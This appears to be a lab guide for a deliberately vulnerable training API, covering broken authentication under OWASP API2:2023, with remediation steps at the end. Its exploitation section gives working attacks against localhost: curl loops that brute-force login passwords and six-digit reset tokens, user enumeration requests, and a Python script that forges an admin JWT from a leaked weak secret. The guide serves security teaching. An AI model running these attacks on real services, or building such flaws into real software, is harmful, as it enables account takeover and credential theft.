API2:2023 Broken Authentication

CRITICAL SEVERITY

Description

Broken Authentication vulnerabilities occur when authentication mechanisms are incorrectly implemented, allowing attackers to compromise authentication tokens, exploit implementation flaws to assume other users' identities, or bypass authentication entirely.

Affected Files

  • app/routes/auth.py
  • app/utils.py
  • app/config.py

Vulnerabilities Present

Issue Location Impact
Plain text passwords auth.py, models.py Password exposure in database
Weak JWT secret config.py Token forgery possible
No rate limiting auth.py Brute force attacks
User enumeration auth.py Valid usernames revealed
Weak reset token utils.py Password reset bypass
Token in URL/cookies utils.py Token leakage via logs

Exploitation Guide

1. User Enumeration

Different error messages reveal whether a user exists:

# Try non-existent user
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "nonexistent", "password": "test"}'
# Response: {"error": "User not found"} - HTTP 404

# Try existing user with wrong password
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrongpassword"}'
# Response: {"error": "Invalid password for user admin"} - HTTP 401

# This confirms 'admin' is a valid username!

2. Brute Force Attack (No Rate Limiting)

No rate limiting allows unlimited login attempts:

# Brute force script
for password in password password123 admin admin123 123456 qwerty; do
  echo "Trying: $password"
  result=$(curl -s -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": \"$password\"}")
  if echo "$result" | grep -q "token"; then
    echo "SUCCESS! Password: $password"
    echo "$result"
    break
  fi
done

3. Weak Password Reset Token

Reset tokens are only 6 digits - easily brute-forceable:

# Request password reset
curl -X POST http://localhost:5000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@vulnapi.local"}'

# Response includes the token! (bad practice)
# {"reset_token": "123456", ...}

# Even without the response, brute force 6 digits (1M combinations)
for token in $(seq 100000 999999); do
  result=$(curl -s -X POST http://localhost:5000/api/auth/reset-password \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"admin@vulnapi.local\", \"reset_token\": \"$token\", \"new_password\": \"hacked\"}")
  if echo "$result" | grep -q "successful"; then
    echo "Valid token: $token"
    break
  fi
done

4. JWT Token Forgery

The JWT secret is weak and predictable:

# Get the weak secret from config endpoint
curl -s http://localhost:5000/api/admin/config | jq '.config.JWT_SECRET'
# Returns: "jwt-secret-weak"

# Forge a token using Python
python3 << 'EOF'
import jwt
from datetime import datetime, timedelta

payload = {
    'user_id': 1,  # Admin user
    'role': 'admin',
    'exp': datetime.utcnow() + timedelta(days=365),
    'iat': datetime.utcnow()
}

token = jwt.encode(payload, 'jwt-secret-weak', algorithm='HS256')
print(f"Forged admin token: {token}")
EOF

# Use the forged token
curl -X GET http://localhost:5000/api/users/me \
  -H "Authorization: Bearer "

5. Token in URL Parameter

Tokens accepted from URL parameters can leak in logs:

# Token works from query parameter (leaks in server logs, browser history)
curl "http://localhost:5000/api/users/me?token="

# Also works from cookies
curl -X GET http://localhost:5000/api/users/me \
  -H "Cookie: auth_token="

6. Password Exposure in Response

Login response includes password in plain text:

# Login returns full user data including password!
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}' | jq '.user.password'
# Returns: "admin123"

Impact

  • Account Takeover: Brute force any account password
  • Identity Spoofing: Forge tokens to impersonate any user
  • Mass Account Compromise: Reset any user's password
  • Credential Theft: Passwords exposed in responses
  • Session Hijacking: Tokens leak via URLs and logs

Remediation

  1. Use bcrypt or Argon2 for password hashing
  2. Implement rate limiting (e.g., 5 attempts per minute)
  3. Use cryptographically secure random secrets for JWT
  4. Implement account lockout after failed attempts
  5. Use consistent error messages to prevent enumeration
  6. Never expose passwords in responses
  7. Only accept tokens in Authorization header
